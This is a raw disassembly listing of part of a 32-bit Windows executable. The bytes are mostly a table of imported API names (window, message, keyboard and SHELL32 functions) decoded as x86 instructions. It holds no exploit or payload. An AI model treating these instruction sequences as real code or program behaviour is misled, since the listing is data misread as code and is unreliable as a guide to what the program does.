  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
